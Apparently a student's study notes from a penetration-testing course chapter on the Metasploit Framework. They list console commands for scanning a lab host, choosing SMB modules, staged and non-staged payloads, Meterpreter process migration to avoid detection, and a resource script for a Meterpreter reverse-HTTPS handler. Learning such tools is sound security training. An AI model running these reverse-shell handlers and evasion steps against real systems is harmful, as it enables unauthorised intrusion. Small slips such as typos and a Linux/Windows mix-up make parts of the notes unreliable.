### Chapter 20: MSF

                  THE 

 M                                F
 	etaSploit                ramework

~~~~~~~~~~~~~~~~~~~~~~

Start Metasploit and the asociated db service: 
sudo msfdb init

Launch the console:
sudo msfconsole

Check db status:
 msf6 > db_status
 
 Create a new workspace: 
msf6 > workspace -a pen200

Run nmap within MSF:
msf6 > db_nmap -A 192.168.50.202
msf6 > hosts
msf6 > services

Find the correct module: 
msf6 > search type:auxiliary smb
 
 Use the module (for example, module 56):
 msf6 > use 56
 
 msf6 auxiliary(scanner/smb/smb_version) > show options
 msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
 msf6 auxiliary(scanner/smb/smb_version) > run
 
 msf6 auxiliary(scanner/smb/smb_version) > vulns
  msf6 auxiliary(scanner/smb/smb_version) > creds
  
  Staged vs. Non-staged Payloads:
   Non-staged is set entirely along with the exploit. The full shellcode and everything is all-in-one. More stable, but bigger.
   Staged is two parts. First part contains a payloaf that causes the victim machine to connect back to the attacker and then tranfer
   over the larger secondary payload containing the rest of the shellcode and execute it. 
   
   Staged can be used to overcome space limitations in an exploit, antivrius detection 
  
  shell_reverse_tcp is non staged.
  shell/reverse_tcp is staged
  
  Meterpreter:
  Metasploit contains the Meterpreter1 payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default. Meterpreter offers capabilities that are especially useful in the post-exploitation phase and exists for various operating systems such as Windows, Linux, macOS, Android, and more.
  all Meterpreter payloads are staged even if they say non-staged.
  "non-staged" staged meterpreter is best for network traffic. 
  meterpreter > shell
  
  use “migrate” to move to an undetected process number on linux
		  meterpreter > execute -H -f notepad
		Process 2720 created.

		meterpreter > migrate 2720
		[*] Migrating from 8052 to 2720...
		[*] Migration completed successfully.

Post exploitation import module:
			PS C:\Windows\system32> Import-Module NtObjectManager
			Import-Module NtObjectManager

			PS C:\Windows\system32> Get-NtTokenIntegrityLevel
			Get-NtTokenIntegrityLevel
			Medium
  
Use ^Z to background the shell:
		PS C:\Windows\system32> ^Z
		Background channel 1? [y/N]  y

		meterpreter > bg
		[*] Backgrounding session 9...  
		
  
  msfvenom
  Create an executable file of any payload. 
  
  
  Automate with Resource Script:
createa new .rc file with the following lines:  
		use exploit/multi/handler
		set PAYLOAD windows/meterpreter_reverse_https
		set LHOST 192.168.119.4
		set LPORT 443
		set AutoRunScript post/windows/manage/migrate 
		set ExitOnSession false
		run -z -j
		

